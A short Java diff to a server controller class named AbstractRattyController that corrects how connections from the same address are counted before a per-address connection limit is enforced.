@@ -66,7 +66,10 @@ public abstract class AbstractRattyController implements IServerObserver, IConne
 	
 	@Override
 	public void connected(final ActiveServer server, final ActiveConnection connection) {
-		final long size = connections.stream().map(ActiveConnection::getAddress).count();
+		final String address = connection.getAddress();
+		final long size = connections.stream()
+				.filter(con -> con.getAddress().equals(address))
+				.count();
 		
 		if (size >= MAX_SAME_CONNECTION_COUNT) {
 			final FreePacket free = new FreePacket();
